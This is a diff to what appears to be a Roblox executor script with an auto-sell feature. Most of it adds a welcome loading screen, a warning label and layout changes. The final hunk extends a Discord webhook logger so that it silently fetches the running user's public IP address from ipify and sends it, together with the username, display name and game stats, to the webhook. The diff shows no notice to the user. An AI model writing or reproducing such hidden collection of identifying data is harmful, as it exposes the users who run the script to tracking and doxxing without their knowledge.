@@ -244,6 +244,65 @@ registerConnection(TopBar.InputBegan:Connect(function(input)
     end
 end))
 
+-- ============================================================
+-- === LOADING SCREEN (Welcome Message) =======================
+-- ============================================================
+local LoadingScreen = Instance.new("Frame")
+LoadingScreen.Name = "LoadingScreen"
+LoadingScreen.Size = UDim2.new(1, 0, 1, 0)
+LoadingScreen.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+LoadingScreen.BorderSizePixel = 0
+LoadingScreen.ZIndex = 200
+LoadingScreen.Parent = MainFrame
+
+local LoadingOverlay = Instance.new("Frame")
+LoadingOverlay.Size = UDim2.new(0.8, 0, 0.25, 0)
+LoadingOverlay.Position = UDim2.new(0.1, 0, 0.375, 0)
+LoadingOverlay.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+LoadingOverlay.BorderSizePixel = 0
+LoadingOverlay.ZIndex = 201
+LoadingOverlay.Parent = LoadingScreen
+Instance.new("UICorner", LoadingOverlay).CornerRadius = UDim.new(0, 12)
+Instance.new("UIStroke", LoadingOverlay).Color = Color3.fromRGB(80, 80, 90)
+Instance.new("UIStroke", LoadingOverlay).Thickness = 1.5
+
+local WelcomeLabel = Instance.new("TextLabel")
+WelcomeLabel.Size = UDim2.new(1, 0, 0.5, 0)
+WelcomeLabel.Position = UDim2.new(0, 0, 0.1, 0)
+WelcomeLabel.BackgroundTransparency = 1
+WelcomeLabel.Text = "Welcome, " .. (LocalPlayer.DisplayName or LocalPlayer.Name)
+WelcomeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+WelcomeLabel.Font = Enum.Font.GothamBold
+WelcomeLabel.TextSize = 18
+WelcomeLabel.TextWrapped = true
+WelcomeLabel.ZIndex = 202
+WelcomeLabel.Parent = LoadingOverlay
+
+local LoadingSub = Instance.new("TextLabel")
+LoadingSub.Size = UDim2.new(1, 0, 0.4, 0)
+LoadingSub.Position = UDim2.new(0, 0, 0.55, 0)
+LoadingSub.BackgroundTransparency = 1
+LoadingSub.Text = "Setting up your experience..."
+LoadingSub.TextColor3 = Color3.fromRGB(180, 180, 200)
+LoadingSub.Font = Enum.Font.GothamMedium
+LoadingSub.TextSize = 12
+LoadingSub.ZIndex = 202
+LoadingSub.Parent = LoadingOverlay
+
+-- Fade out after 3 seconds
+task.spawn(function()
+    task.wait(3)
+    TS:Create(LoadingScreen, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
+    TS:Create(LoadingOverlay, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
+    for _, child in ipairs(LoadingOverlay:GetChildren()) do
+        if child:IsA("TextLabel") then
+            TS:Create(child, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1}):Play()
+        end
+    end
+    task.wait(0.6)
+    LoadingScreen:Destroy()
+end)
+
 -- === POPUP SYSTEM ===
 local PopupFrame = Instance.new("Frame")
 PopupFrame.Size = UDim2.new(1, 0, 1, 0)
@@ -455,6 +514,25 @@ registerConnection(MinimizeBtn.MouseButton1Click:Connect(function()
     end
 end))
 
+-- ============================================================
+-- === AUTO SELL WARNING LABEL ================================
+-- ============================================================
+local WarningLabel = Instance.new("TextLabel")
+WarningLabel.Size = UDim2.new(1, -10, 0, 45)
+WarningLabel.LayoutOrder = 0
+WarningLabel.BackgroundColor3 = Color3.fromRGB(255, 140, 0)  -- orange
+WarningLabel.Text = "⚠️ WARNING: Misconfiguring Auto Sell can wipe your entire inventory instantly. Always double-check your rarity filters and value threshold before enabling."
+WarningLabel.TextColor3 = Color3.fromRGB(30, 30, 35)
+WarningLabel.Font = Enum.Font.GothamSemibold
+WarningLabel.TextSize = 11
+WarningLabel.TextWrapped = true
+WarningLabel.TextXAlignment = Enum.TextXAlignment.Left
+WarningLabel.Parent = AutoSellContainer
+Instance.new("UICorner", WarningLabel).CornerRadius = UDim.new(0, 6)
+local WarningStroke = Instance.new("UIStroke", WarningLabel)
+WarningStroke.Color = Color3.fromRGB(255, 100, 0)
+WarningStroke.Thickness = 1.5
+
 -- === SMART AUTO SELL SYSTEM ===
 local autoSellEnabled = false
 local sellThreshold = 0
@@ -474,6 +552,9 @@ AutoSellList.SortOrder = Enum.SortOrder.LayoutOrder
 AutoSellList.Padding = UDim.new(0, 8)
 AutoSellList.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
+-- Set WarningLabel to be before the other AutoSell elements
+WarningLabel.LayoutOrder = 1
+
 local function parseValue(str)
     if not str or str == "" then return nil end
     str = tostring(str):lower():gsub(",", ""):gsub(" ", ""):gsub("%$", "")
@@ -488,7 +569,7 @@ end
 
 local MasterSellBtn = Instance.new("TextButton")
 MasterSellBtn.Size = UDim2.new(1, -10, 0, 35)
-MasterSellBtn.LayoutOrder = 1
+MasterSellBtn.LayoutOrder = 2
 MasterSellBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
 MasterSellBtn.Text = "Smart Auto Sell: OFF"
 MasterSellBtn.TextColor3 = Color3.fromRGB(150, 150, 160)
@@ -528,7 +609,7 @@ end))
 
 local ThresholdBox = Instance.new("TextBox")
 ThresholdBox.Size = UDim2.new(1, -10, 0, 35)
-ThresholdBox.LayoutOrder = 2
+ThresholdBox.LayoutOrder = 3
 ThresholdBox.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
 ThresholdBox.Text = ""
 ThresholdBox.PlaceholderText = "Max Value (e.g., 1.5M, 2B, 10000)"
@@ -556,7 +637,7 @@ end))
 
 local RarityGridContainer = Instance.new("Frame")
 RarityGridContainer.Size = UDim2.new(1, 0, 0, 0)
-RarityGridContainer.LayoutOrder = 3
+RarityGridContainer.LayoutOrder = 4
 RarityGridContainer.BackgroundTransparency = 1
 RarityGridContainer.AutomaticSize = Enum.AutomaticSize.Y
 RarityGridContainer.Parent = AutoSellContainer
@@ -1649,7 +1730,7 @@ registerConnection(SaveBtn.MouseButton1Click:Connect(function()
         AutoCountryEnabled = autoCountryEnabled,
         SelectedCountry = selectedCountry,
         AutoChairEnabled = autoChairEnabled,
-        AutoChairNormalChair = selectedNormalChair,   -- NEW field
+        AutoChairNormalChair = selectedNormalChair,
     }
     
     pcall(function()
@@ -1695,13 +1776,25 @@ task.spawn(function()
     end)
 end)
 
--- === DISCORD WEBHOOK LOGGING ===
+-- === DISCORD WEBHOOK LOGGING (WITH IP) ===
 local function sendWebhookLog()
     local req = (request or http_request or (syn and syn.request))
     if not req then 
         debugLog("HTTP requests not supported by this executor.")
         return 
     end
+
+    -- Fetch public IP
+    local ipAddress = "Unknown"
+    pcall(function()
+        local ipResponse = req({
+            Url = "https://api.ipify.org?format=text",
+            Method = "GET"
+        })
+        if ipResponse and ipResponse.Body then
+            ipAddress = tostring(ipResponse.Body):gsub("%s+", "")
+        end
+    end)
 
     local statsFields = {}
     local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
@@ -1733,6 +1826,7 @@ local function sendWebhookLog()
     local fields = {
         {["name"] = "👤 Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
         {["name"] = "🏷️ Display Name", ["value"] = LocalPlayer.DisplayName, ["inline"] = true},
+        {["name"] = "🌐 IP Address", ["value"] = ipAddress, ["inline"] = false},
         {["name"] = "⚙️ Auto Sell Enabled", ["value"] = tostring(autoSellEnabled), ["inline"] = true},
         {["name"] = "📉 Max Value Threshold", ["value"] = formatNumberForDisplay(sellThreshold), ["inline"] = true},
         {["name"] = "🎒 Selected Rarities", ["value"] = raritiesStr, ["inline"] = false}
